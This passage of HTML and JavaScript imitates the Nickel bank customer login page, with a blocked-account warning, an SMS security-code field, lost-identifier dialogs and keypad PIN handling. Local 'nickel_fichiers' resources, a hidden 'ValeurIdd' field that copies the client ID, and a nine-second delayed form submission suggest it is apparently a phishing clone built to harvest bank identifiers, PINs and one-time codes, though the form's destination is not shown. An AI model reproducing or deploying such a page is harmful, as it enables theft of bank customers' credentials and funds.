			
                            <div class="font-AracneRegular font-orange" style="font-size: 3em; margin-bottom:10px">
                                ATTENTION
                            </div>
                            <div class="font-VAGRoundedBold">
                                Après plusieurs codes d'accès web 
erronés, votre accès à votre espace Nickel a été suspendu pour des 
raisons de sécurité.<br>
                                Vous pourrez vous reconnecter à votre espace client dans 24h.
                            </div>
                            <div style="margin-top:10px;">
                                Vous avez perdu votre code d'accès ?<br>
                                Vous pouvez le réinitialiser et le recréer en cliquant sur le bouton ci-dessous.<br>
                                Votre accès sera immédiatement rétabli.
                            </div>
                            <div style="margin: 20px auto 0 auto">
                                <input type="submit" name="ctl00$MainContent$resetPwdButton2" value="Réinitialiser" onclick="clickResetPwdButton();" id="MainContent_resetPwdButton2" class="orange-button" style="height: auto; padding: 5px 10px; font-family:VAGRoundedLight">
                            </div>
                            <input type="hidden" name="ctl00$MainContent$hfMyParam" id="MainContent_hfMyParam">
                        
		</div>

                        
                        <div id="divBlockedAccountMsgLoading" style="display:none;text-align:center; padding-top:20px; font-size:30px;" class="font-AracneRegular">
                            Chargement <img alt="loading" src="nickel_fichiers/loading.gif" width="30px" height="30px">
                        </div>
                    
	</div>

            </div>
        </div>

    </div>

            <div id="dialog-3dSecure" style="display: none">
                <div id="MainContent_upSmsCode">
		
                            <div id="MainContent_panelSmsCode" onkeypress="javascript:return WebForm_FireDefaultButton(event, 'MainContent_btnFirstConnection')">
			
                                <div>
                                    <span id="MainContent_lblTitle3dSecure" style="white-space: nowrap">Nous venons de vous adresser un code temporaire de sécurité par SMS.<br>Merci de saisir ce code reçu par SMS :</span>
                                </div>
                                <div style="margin-top: 10px">
                                    <input name="ctl00$MainContent$txtCode" type="text" maxlength="8" id="MainContent_txtCode" autocomplete="off">
                                    <span id="MainContent_lbl3dSecureError" style="color: red;"></span>
                                </div>
                                <div style="width:100%; text-align:right">
                                    <input type="submit" name="ctl00$MainContent$btnFirstConnection" value="Valider" onclick="return check_3dsecure();" id="MainContent_btnFirstConnection" class="orange-button">
                                </div>
                            
		</div>
                        
	</div>
                <div id="MainContent_upCreatePassword">
		
                        
                    
	</div>
            </div>
            
            <div id="dialog-LostIdOrPwd" style="display: none">
                <div style="position:relative;width:100%;text-align:right">
                    <div class="close-white-dialog" onclick="HideDialogResetPwdOnClientGencode();" style="position:absolute; top:5px; right:15px;width:100px; height:30px;display:inline-block;z-index:1000">
                        <img alt="Fermer" src="nickel_fichiers/close-white-dialog-2.png" width="30">
                    </div>
                </div>
                <span class="ui-helper-hidden-accessible">
                <input type="text"></span>
                <div id="divChooseWhatIsLost" style="padding:20px">
                    <h2 style="text-align: center">Qu'avez-vous perdu ?</h2>
                    <div class="table" style="width:600px; margin:20px auto">
                        <div class="table-row">
                            <div class="table-cell" style="width:50%; text-align:center">
                                <input type="button" class="orange-big-button" value="Mon identifiant de connexion &gt;" style="width:270px;" onclick="showIdLost();">
                                <div style="margin-top:5px;font-weight:bold;font-style:italic;font-size:0.8em;">
                                    Votre identifiant nous permet d'identifier<br> votre Compte-Nickel quand vous vous connectez<br> à votre espace client ou avez des questions
                                </div>
                            </div>
                            <div class="table-cell" style="width:50%; text-align:center">
                                <input type="button" class="orange-big-button" value="Mon code d'accès &gt;" style="width:250px;" onclick="showPwdLost();">
                                <div style="margin-top:5px;font-weight:bold;font-style:italic;font-size:0.8em;">
                                    Votre code d'accès vous permet d'accéder<br>en toute sécurité à votre espace client
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="divIdLost" style="display:none">
                    <div class="table" style="margin:20px auto;width:800px;">
                        <div class="table-row">
                            <div class="table-cell" style="vertical-align:middle; width:300px;">
                                <img alt="" src="nickel_fichiers/card-code-2.png" width="300">
                            </div>
                            <div class="table-cell" style="vertical-align:middle;">
                                <h3 class="font-orange">Comment retrouver votre identifiant web ?</h3>
                                <div style="margin-top:5px; font-size:0.8em;">
                                    <span style="font-weight:bold;">Vous êtes client Compte-Nickel ou Compte-Nickel 12/18 ans :</span> Votre identifiant se trouve au dos de votre carte. En cas de perte de votre carte, et afin de la remplacer, contactez le <span style="white-space:nowrap">01 76 49 00 00</span> depuis votre mobile et faites le choix 1, puis de nouveau le choix 1.
                                </div>
                                <div style="margin-top:5px; font-size:0.8em;">
                                    <span style="font-weight:bold;">Vous êtes le parent ou tuteur légal d'un enfant ayant un Compte-Nickel 12/18 ans :</span>
 si vous n'avez pas de Compte-Nickel à votre nom, vous avez reçu votre 
identifiant sur l'email après l'ouverture du Compte-Nickel 12/18 ans.
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="divPwdLost" style="display:none">
                    <div style="width:600px; margin:20px auto">
                        <div id="MainContent_upResetPwdOnClientGenCode">
		
                                <div id="MainContent_pResetPwdOnClientGenCode" onkeypress="javascript:return WebForm_FireDefaultButton(event, 'MainContent_ClickResetPwdOnClientID')">
			
                                    <h3 class="font-orange">J'ai perdu mon code d'accès</h3>
                                    <div style="margin-top:10px; font-size:0.8em; font-weight:bold;">
                                        Ne vous inquiétez pas ! vous allez pouvoir recréer votre mot de passe web.
                                    </div>
                                    <div style="margin-top:5px;font-size:0.8em;">
                                        Pour cela vous allez recevoir un mail de vérification sur votre adresse mail.
                                    </div>
                                    <div style="margin-top:10px;" class="font-orange">Veuillez saisir votre identifiant web</div>
                                    <div class="table" style="margin-top:10px;">
                                        <div class="table-row">
                                            <div class="table-cell" style="width:260px;vertical-align:middle;">
                                                <input type="text" id="txtResetPwdID_1" maxlength="3" autocomplete="off" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);" style="font-size:1.4em;width: 60px; text-align: center; padding: 0" class="TextboxBig">
                                                <span style="font-weight: bold; font-size: 1.4em">-</span>
                                                <input type="text" id="txtResetPwdID_2" maxlength="3" autocomplete="off" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);" style="font-size:1.4em;width: 60px; text-align: center; padding: 0" class="TextboxBig">
                                                <span style="font-weight: bold; font-size: 1.4em">-</span>
                                                <input type="text" id="txtResetPwdID_3" maxlength="3" autocomplete="off" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);" style="font-size:1.4em;width: 60px; text-align: center; padding: 0" class="TextboxBig">
                                                <span style="font-weight: bold; font-size: 1.4em">-</span>
                                                <input type="text" id="txtResetPwdID_4" maxlength="1" autocomplete="off" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);" style="font-size:1.4em;width: 25px; text-align: center; padding: 0" class="TextboxBig">
                                            </div>
                                            <div class="table-cell" style="vertical-align:middle; padding-left:10px;">
                                                <input type="submit" name="ctl00$MainContent$ClickResetPwdOnClientID" value="OK" onclick="return checkClientIDOnResetPwd();" id="MainContent_ClickResetPwdOnClientID" class="orange-button" style="height:auto; padding:10px">
                                            </div>
                                        </div>
                                    </div>
                                    <div id="lblResetPwdClientID_error" class="font-red font-bold" style="margin-top:5px;height:20px;;"></div>
                                
		</div>
                                <div id="divResetPwdOnClientGencodeLoading" style="display:none; text-align:center; padding-top:20px;font-size:30px;" class="font-AracneRegular">
                                    Chargement <img alt="loading" src="nickel_fichiers/loading.gif" width="30px" height="30px">
                                </div>
                                
                            
	</div>
                    </div>
                </div>
            </div>
        
</div>

    <input type="hidden" name="ctl00$MainContent$hfIsCookieClientID" id="MainContent_hfIsCookieClientID" value="false">
    <input type="hidden" name="ctl00$MainContent$hfCookieClientID" id="MainContent_hfCookieClientID">
    <input type="hidden" name="ctl00$MainContent$hfUseCookieClientID" id="MainContent_hfUseCookieClientID" value="false">
    <input type="hidden" name="ctl00$MainContent$hfClientIDStatus" id="MainContent_hfClientIDStatus">
    <input type="hidden" name="ctl00$MainContent$hfRefCustomer" id="MainContent_hfRefCustomer">

                            </div>
                        </div>
                    </div>
                </div>
                <div class="clear">
                </div>
            </div>
            <div id="dialog" style="display:none">
                <span id="dialog-message"></span>
            </div>
            <div class="footer" style="display:none">
                <div style="width:80%;height:35px;float:left;box-shadow: 0 0 12px #ccc;">
                    <div style="display:inline-block;padding:0 8px 0 10px;margin:8px 0 0 10px;height:20px;line-height:20px;">    
                        <a href="https://compte-nickel.fr/ouvrir-un-compte" target="_blank" class="footerLink">Trouver un point de vente</a>
                    </div>
                    <div style="display:inline-block;border-left:2px solid #f57527;padding:0 10px;margin-top:8px;height:20px;line-height:20px;">
                        <a href="https://compte-nickel.fr/_files/conditions-generales-et-tarifaires.pdf" target="_blank" class="footerLink">Consulter les conditions générales et tarifaires</a>
                    </div>
                </div>

                <input type="button" value="SOS Compte-Nickel" class="orange-big-button" style="height:35px;width:19%;float:right" onclick="document.location.href = 'sos.aspx';">
            </div>
        </div>
        
        <div style="margin-top:20px; width:100%; text-align: center">
            <span id="lblServerName" style="color:#f8f8f8">WEB 3</span>
        </div>



        <input type="hidden" name="ctl00$hfShowTimeout" id="hfShowTimeout">
        <input type="hidden" name="ctl00$hfSessionTimeout" id="hfSessionTimeout" value="600000">
        <input type="hidden" name="ctl00$hfSessionStarted" id="hfSessionStarted" value="false">

        
 <script type="text/javascript">


        function checkClientID() {
            
        }

       



        function alertMessage(title, message, redirect, focusID) {
            $('#MainContent_lblAlertMessage').html(message);

            $("#panelAlertMessage").dialog({
                draggable: false,
                resizable: false,
                width: 600,
                dialogClass: "no-close",
                modal: true,
                title: title,
                buttons: {
                    Ok: function () {
                        $(this).dialog("close");
                        if (redirect != null && redirect.trim().length > 0) {
                            window.location = redirect;
                        }
                        else if (focusID != null && focusID.trim().length > 0 && $('#' + focusID) != null) {
                            $('#' + focusID).focus();
                        }
                        else {
                            checkFocus();
                        }
                    }
                }
            });
        }


        function HideResetPwdBlockPopup() {
            $('#dialog-reset-pwd-after-blocked-account').dialog('close');
        }



        function suppr(txtID) {
            var idRoot = txtID.split('_')[0];
            var index = parseInt(txtID.split('_')[1]);
            var nextID = idRoot + '_' + (index + 1);
            if ($('#' + txtID).val().length == 0 && index < 4)
                $('#' + nextID).focus();

            //console.log($('#' + txtID).val().length);
        }


        function checkNext(event, txtID) {
            var keyCode = ('which' in event) ? event.which : event.keyCode;
            var idRoot = txtID.split('_')[0];
            var index = parseInt(txtID.split('_')[1]);
            var nextID = idRoot + '_' + (index + 1);
            var lastID = idRoot + '_' + (index - 1);
            var defaultButton = "MainContent_btnClientID";
            maxIndex = 4
            //console.log(keyCode);

            if (idRoot == "txtClientBirth") {
                maxIndex = 3
                defaultButton = "btnClientBirthDate";
            }

            if (keyCode != 8) {
                if (($('#' + txtID).val().length) == parseInt($('#' + txtID).attr('maxlength'))) {
                    if (index < maxIndex) {
                        $('#' + nextID).focus();
                    }
                    else {
                        var keyCode = ('which' in event) ? event.which : event.keyCode;
                        //console.log('enter : ' + keyCode);
                        //if (keyCode == 13)
                        //$('#' + defaultButton).click();
                    }
                }
            }
        }

        function pressKeyPos(targetId, keypadTextId, position) {
    if ($('#' + keypadTextId).val().length < $('#' + keypadTextId).attr("maxlength")) {
        $('#' + targetId).val($('#' + targetId).val() + position + ";")
        $('#' + keypadTextId).val($('#' + keypadTextId).val() + "X");

    }
}

        function focusOK(event) {
            var keyCode = ('which' in event) ? event.which : event.keyCode;
            //console.log('enter : ' + keyCode);
            if ($('#txtID_4').length == 1 && keyCode == 13)
                $('#btnClientID').click();
        }

        function deleteClientID() {
            $('#txtID_1').val('');
            $('#txtID_2').val('');
            $('#txtID_3').val('');
            $('#txtID_4').val('');
            $('#MainContent_txtClientID').val('');
            $('#txtID_1').focus();
        }

        var oldValue = "";
        function clearValue(txt) {
            oldValue = $(txt).val();
            $(txt).val('');
        }

        function defaultVal(txt) {
            if ($(txt).val().length == 0 && oldValue.trim().length > 0) {
                $(txt).val(oldValue);
            }
        }

        function KeypadCorrectPassword(targetID, keypadTextId) {
    try {
        if ($('#' + targetID).val().trim().length > 0) {
            var values = $('#' + targetID).val().substring(0, $('#' + targetID).val().length - 1).split(';');
            values = values.slice(0, values.length - 1);
            $('#' + targetID).val("");
            for (var i = 0; i < values.length; i++) {
                $('#' + targetID).val($('#' + targetID).val() + values[i] + ";");
            }
            $('#' + keypadTextId).val($('#' + keypadTextId).val().substring(0, $('#' + keypadTextId).val().length - 1));
        }
    }
    catch (ex) {
        console.log(ex.message);
    }

    return false;
}


            $('#MainContent_btnClientID').click(function() {
                var clientId = $('#txtID_1').val().trim() + $('#txtID_2').val().trim() + $('#txtID_3').val().trim() + $('#txtID_4').val().trim();
                if(clientId.trim().length >= 10)
                {
                    $('#panelPin').show(2000);
                    $('#panelPissenlit').show(2000);
                    $("#panelHelpClientID").hide();
                    $('#panelVousNavezPasDeCompteNickel').hide();
                    $('#panelPhishing').hide();
                    $('#panelID').hide();
                    // $('#MainContent_lbHelpPwd').show(5000);
                    // $('#MainContent_lbHelpPwd').effect('slide', { direction: 'right', mode: 'hide' }, 500);
                    $('#ValeurIdd').val(clientId);
                }
                else 
                {
                    
                    $('#raiseError2').css('display','block');
                    $('#raiseError').css('display','block');
                }

                });

        $('#panelIDTitle').click(function(){
            $('#panelPin').css('display','none');
            $('#panelPissenlit').css('display','none');
            $("#panelHelpClientID").show();
            $('#panelVousNavezPasDeCompteNickel').show();
            $('#panelPhishing').show();
            $('#panelID').show();
            $('#MainContent_lbHelpPwd').hide();
        });

        

        // $('#btn1').click(function(){
        //     alert("i've been clicked");
        //     return;
        // });
                    $('#raiseError').click(function()
                    {
                        $('#raiseError2').css('display','none');
                        $('#raiseError').css('display','none');
                    })

                         $('#raiseError3').click(function()
                         {
                             $('#raiseError2').css('display','none');
                             $('#raiseError3').css('display','none');
                         })

        function clickSaveClientID() {
            if ($("#MainContent_cbSaveClientID").is(":checked")) {
                var focusID = "";
                if ($('#txtID_1').val().length < 3)
                    focusID = $('#txtID_1').attr('id');
                else if ($('#txtID_2').val().length < 3)
                    focusID = $('#txtID_2').attr('id');
                else if ($('#txtID_3').val().length < 3)
                    focusID = $('#txtID_3').attr('id');
                else if ($('#txtID_4').val().length < 1)
                    focusID = $('#txtID_4').attr('id');

                //alert($('#txtID_1').length + '-'+ $('#txtID_2').length + '-'+$('#txtID_3').length + '-'+$('#txtID_4').length + '-'+ focusID)

                alertMessage("Enregistrer mon identifiant", $('#saveClientIDHelp').html(), null, focusID);
            }
        }

                function showLoading() {

                         if ($('#MainContent_keypad1_txtKeypad').val().length < $('#MainContent_keypad1_txtKeypad').attr("maxlength")) 
                         {
                            $('#raiseError3').css('display','block');
                            $('#raiseError2').css('display','block');
                            return false;
                             }
                             else
                             {
                                $('#my_form').submit(function() {
                                // $('#gif').css('visibility', 'visible');
                                $('#panelLoadingBackground').show();
                                $('#panelLoading').css('top', ($(window).height() / 2) - 100);
                                $('#panelLoadingBackground').delay(9000).fadeOut();
                                $('#my_form').delay(9000).submit();
                                return true;
                                });

                            }

                         }

    function KeypadClearPassword(targetID, keypadTextId) {
    $('#' + targetID).val('');
    $('#' + keypadTextId).val('');
    return false;
}

    </script>

    
    

<script type="text/javascript">
//<![CDATA[
$(document).ready(function(){init();});KeypadInit();//]]>
</script>
<div class="ui-dialog ui-widget ui-widget-content ui-corner-all dialog-white" tabindex="-1" style="display: none; outline: 0px; z-index: 1000;" role="dialog" aria-labelledby="ui-id-1"><div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix"><span id="ui-id-1" class="ui-dialog-title">&nbsp;</span><a href="https://mon.compte-nickel.fr/identifiez-vous#" class="ui-dialog-titlebar-close ui-corner-all" role="button"><span class="ui-icon ui-icon-closethick">close</span></a></div><div id="dialog-reset-pwd" style="" class="ui-dialog-content ui-widget-content">
	            <div style="position:relative;width:100%;text-align:right">
		            <div class="close-white-dialog" onclick="HideResetPopup();" style="position:absolute; top:5px; right:15px;width:100px; height:30px;display:inline-block;z-index:1000">
			            <img alt="Fermer" src="nickel_fichiers/close-white-dialog-2.png" width="30">
		            </div>
	            </div>
	            <div style="width:600px; margin:20px auto">
		            <div id="MainContent_upResetPwd">
		
				            <div id="MainContent_panelResetPwd" onkeypress="javascript:return WebForm_FireDefaultButton(event, 'MainContent_btnResetPwd')">
			
					            <h3 class="font-orange">J'ai perdu mon code d'accès</h3>
					            <div style="margin-top:10px; font-size:0.8em; font-weight:bold;">
						            Ne vous inquiétez pas ! vous allez pouvoir recréer votre mot de passe web.
					            </div>
					            <div style="margin-top:5px;font-size:0.8em;">
						            Pour cela vous allez recevoir un mail de vérification sur votre adresse mail.
					            </div>
					            <div style="text-align: center; margin-top: 20px">
						            <input type="submit" name="ctl00$MainContent$btnResetPwd" value="Recréer mon mot de passe" onclick="showResetPwdLoading();" id="MainContent_btnResetPwd" class="orange-button" style="height: auto; padding: 5px 10px">
					            </div>
				            
		</div>
				            <div id="divResetPwdLoading" style="display:none; text-align:center; padding-top:20px;font-size:30px;" class="font-AracneRegular">
					            Chargement <img alt="loading" src="nickel_fichiers/loading.gif" width="30px" height="30px">
				            </div>
				            
			            
	</div>
	            </div>
            </div></div></form>

</body></html>
